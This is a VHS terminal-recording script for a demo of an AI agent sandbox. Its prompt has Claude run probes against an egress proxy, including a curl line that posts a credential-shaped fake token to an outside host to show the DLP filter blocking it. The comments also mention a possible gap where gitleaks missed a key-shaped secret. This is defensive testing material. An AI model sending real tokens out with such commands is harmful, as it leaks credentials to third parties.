# VHS tape — drives `bot-bottle start demo` interactively and asks
# claude (the AI) to run four probes via natural-language prompts.
# Setup (demo bottle/agent + dummy SSH key + image pre-warm) and
# teardown happen outside the tape; record via
# `bash scripts/demo-record.sh`, which wraps both and decimates dead
# time post-record.
#
# Re-record when the prompts, manifest, or preflight rendering
# change. Claude's response time varies; the Sleeps below are sized
# for typical bottle launch + tool-use latencies and can be tightened
# if a recording consistently has slack.

Output docs/demo.gif

Set Shell      "bash"
Set FontSize   13
Set Width      1180
Set Height     780
Set Padding    20
Set Theme      "iTerm2 Dark Background"
Set TypingSpeed 40ms

Hide
Type "clear"
Enter
# Pin the backend off-camera so the visible command line stays the
# plain thing a user would type, and so the recording doesn't follow
# the host default (Firecracker on KVM Linux).
Type "export BOT_BOTTLE_BACKEND=macos-container"
Enter
Type "clear"
Enter
Show

# Real invocation. The bottle declares one allowlisted host, one git
# upstream (unreachable on purpose so gitleaks runs before the gate
# would forward), and a FAKE_TOKEN env var shaped like a GitHub PAT.
#
# --headless is what keeps this tape stable. The interactive path opens
# four selectors in a row (bottle multiselect, name/color modal,
# image-mode picker, y/N preflight); driving those blind is how an
# earlier version of this tape silently recorded `command not found`
# after the prompts changed underneath it. --headless skips all four,
# and it keeps the operator's own bottle names out of the recording —
# the multiselect lists every bottle in ~/.bot-bottle/bottles/.
#
# All four probes ride in on the single --prompt because --headless is
# one-shot by construction: the claude provider implements it as
# `claude -p <prompt>` (contrib/claude/agent_provider.py:351), print
# mode, which answers and exits. There is no session left to type a
# follow-up into — an earlier cut of this tape typed probes 2-4 into
# the dead shell and recorded `bash: GET: command not found`.
#
# Note: no --cached-images. Setup does not pre-build, and launch
# derives a per-bottle tag that would not be present anyway;
# --cached-images is a hard failure when that tag is absent. The warm
# layer cache makes the derived build fast regardless.
#
# The probes, in order: (1) a warm-up whose reply at all proves
# api.anthropic.com survives the round trip — bumped TLS handshake, DLP
# scan, forward; (2) a non-allowlisted host, refused by the gateway's
# host filter; (3) an allowlisted host carrying a credential-shaped
# body, where the host check passes and the egress scanner's DLP body
# scan is the only thing left — that route sets outbound_on_match:
# block, so it is an immediate 403 rather than the default `supervise`
# hold-for-approval.
#
# Neither curl discards the body (no -o /dev/null). Without it both
# probes render as a bare `403` and probe 3 is indistinguishable from
# probe 2 — one take had the agent hedge "DLP or host-allowlist
# rejection" because it genuinely could not tell which control fired.
# The refusal text is the only thing that shows the host check passed
# and the body scan is what refused.
#
# Keep apostrophes out of the --prompt text. The whole prompt is a
# single-quoted shell word, so one apostrophe ends it early: a take
# that said "the proxy's refusal text" died on
# `bash: syntax error near unexpected token '('` before the bottle
# ever started.
#
# There is deliberately no git/gitleaks probe. It used to be probe 4,
# pushing an AKIA-shaped key to the git-gate to watch gitleaks reject
# the ref in pre-receive. In the last recording gitleaks reported `no
# leaks found` and the gate forwarded the push; it failed only because
# `upstream.invalid` does not resolve. A GIF of that reads as "the gate
# caught the secret" while showing the opposite, so the probe is out
# until issue #541 settles whether that is a real detection gap.
#
# The probes are spelled as literal shell commands rather than English
# because the agent's discretion is the single biggest source of
# recording flake. One take had it substitute a placeholder
# `ghp_FAKE...` for $FAKE_TOKEN, so the DLP scanner had nothing to
# match and the control reported a clean pass it never earned.
# $FAKE_TOKEN stays unexpanded here on purpose: the bottle's own shell
# expands it inside the sandbox, which is what makes probe 3 a real
# egress test.
Type `bot-bottle start demo --headless --prompt 'Run these three commands with the Bash tool, exactly as written, and report each result in one line, quoting the refusal text returned by the proxy verbatim. Do not substitute placeholders for any value. (1) echo hello; (2) curl --proxy "$HTTPS_PROXY" -s -w " [%{http_code}]" http://example.com/; (3) curl --proxy "$HTTPS_PROXY" -s -w " [%{http_code}]" -d "token=$FAKE_TOKEN" http://example.org/dlp-probe'`
Enter

# Wait for the bottle to launch (networks, the gateway container with
# egress proxy + git gate + supervise, the agent container, claude
# booting) and then run all four probes to completion. Sized for four
# tool-using turns; mpdecimate strips whatever dead time is left over.
Sleep 110s

# Headless exits on its own once the prompt is answered; Ctrl+D just
# closes the recording shell. The launcher tears down the container,
# companion containers, and networks on session end.
Ctrl+D
Sleep 4s
